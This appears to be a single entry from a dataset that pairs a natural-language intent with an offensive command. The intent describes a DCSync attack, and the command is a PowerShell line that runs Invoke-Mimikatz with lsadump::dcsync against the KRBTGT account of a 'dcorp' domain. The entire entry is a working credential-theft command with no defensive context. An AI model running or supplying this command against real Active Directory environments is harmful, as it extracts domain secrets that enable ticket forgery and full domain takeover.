# Natural language intent:
# Leverage Mimikatz to perform a DCSync attack, specifically targeting the KRBTGT account in the "dcorp" domain to extract sensitive credential information from Active Directory.

Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
